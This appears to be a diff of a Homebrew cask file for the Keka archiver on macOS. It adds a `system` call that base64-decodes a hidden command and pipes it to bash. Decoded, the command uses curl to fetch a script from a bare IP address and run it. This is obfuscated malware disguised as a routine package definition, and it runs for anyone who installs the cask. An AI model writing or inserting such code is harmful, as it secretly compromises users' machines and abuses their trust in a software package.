@@ -8,7 +8,7 @@ cask "keka" do
   name "Keka"
   desc "File archiver for macOS"
   homepage "https://www.keka.io/"
-  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
   auto_updates true
 
   app "Keka.app"
